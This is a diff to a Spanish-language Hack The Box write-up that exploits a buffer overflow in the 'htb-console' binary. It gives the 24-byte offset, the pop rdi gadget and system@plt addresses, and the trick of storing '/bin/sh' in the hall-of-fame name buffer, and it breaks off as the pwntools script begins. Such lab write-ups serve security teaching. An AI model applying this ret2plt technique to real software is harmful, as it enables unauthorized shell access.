@@ -1,5 +1,8 @@
 # HTB-Console
 
+
+# Part 1: Probando el programa
+
 EL binario aparentemente es una consola bastante limitada:
 ```console
 └─$ ./htb-console
@@ -22,6 +25,8 @@ Unrecognized command.
 Unrecognized command.
 >> ^C
 ```
+------------------------------
+# Part 2: Leyendo su código
 
 En Ghidra vemos que no hay funcion main sino otras (he renombrado funciones para que se entienda todo mejor):
 ```c
@@ -77,6 +82,8 @@ void console(char *comando) {
             };};}
   return;}
 ```
+------------------------------
+# Part 3: Encontrando el bug
 
 Probando cada uno de los comandos intentaremos causar un segfault:
 
@@ -98,7 +105,9 @@ zsh: segmentation fault  ./htb-console
 
 Por tanto es por flag por donde está la avería.
 
-
+------------------------------
+# Part 4: Desarrollando el exploit
+```
 gef➤  pattern create 50
 aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
 -------------------------------------------
@@ -111,43 +120,44 @@ gef➤  pattern offset $rsp
 [+] Searching for '$rsp'
 [+] Found at offset 24 (little-endian search) likely
 (└─$ echo "daaaaaaaeaaaaaaafaaaaaa" | wc -c   # -> 24)
-
+```
 Dentro de "flag" -> 24 bytes hasta dar con el RSP (puntero de instrucción)
 
+Como es un stripped binary, no está llamando a libc sino que la tiene cargada directamente en sí mismo, así que el ret2libc cambia mucho. 
+Por ejemplo la string "bin/sh" no está incluida en el binario sino solo "date" para system (se ve en el código arriba)
 
-Como es un stripped binary, no está llamando a libc sino que la tiene cargada directamente en sí mismo, así que
-el ret2libc cambia mucho. Por ejemplo la string "bin/sh" no está incluida en el binario sino solo "date" para 
-system (se ve en el código arriba)
+El ataque sería tal que así: ```pop rdi + "/bin/sh" + system   -> system("/bin/sh")```
+Es decir abrimos el registro (pop rdi) para cargarle a la función system el agrumento "bin/sh"
 
-pop rdi + "/bin/sh" + system
+Todo esto irá despues de los 24 bytes basura que desplazarán la pila hasta escribir el rsp o puntero de instrucción que nos ejecute nuestro ataque.
 
-1. Hay que buscar donde tiene el binario la llamada a system (no libc sino el binario en si, cargado en la plt
-como si fuera un printf)
+1. Hay que buscar donde tiene el binario la llamada a system (no libc sino el binario en si, cargado en la plt como si fuera un printf)
 ```console
 └─$ objdump -D htb-console | grep "system"
 0000000000401040 <system@plt>:
   401381:	e8 ba fc ff ff       	call   401040 <system@plt>
 ```
-2. Buscar el gadget para abrir el registro que le pasara un arumgneto a la funcion system
+2. Buscar el gadget para abrir el registro que le pasara un argumento a la funcion system:
 ```console
 └─$ ropper --search  "pop rdi" -f ./htb-console 
 0x0000000000401473: pop rdi; ret;
 ```
-
-A diferencia de los ret2libc normales que buscabamos "bin/sh" dentro de libc  importado ahora como no importa nada
-no se puede y en el binario solo llama system a "date".
+3. String "/bin/sh"
+A diferencia de los ret2libc normales que buscabamos "bin/sh" dentro de libc importado ahora como no importa nada no se puede y no existe ese "/bin/sh"
 
 Digamos que hay que escribir ese "bin/sh" en otro lugar ¿Pero dónde?
 En el comando "hof" (hall of fame) nos piden un nombre y lo meten en una variable.
-En ghidra, si clicamos a la función &NAME (si no se cambio es DAT_004040B0) y nos da su dirección -> 4040b0
-
->> hof
+En ghidra, si clicamos a la función &NAME (si no se cambio es "DAT_004040B0") y nos da su dirección -> 4040b0. Ahí es donde almacenara "/bin/sh"
+```
+>> `hof
 Enter your name: bin/sh
 See you on HoF soon! :)
 C^
 
 gef➤  x/s 0x4040b0
 0x4040b0:	"/bin/sh\n"
+```
+Por tanto el exploit (usando pwntools esta vez ya que tenemos que lidiar con procesos):
 
 ```python
 from pwn import *
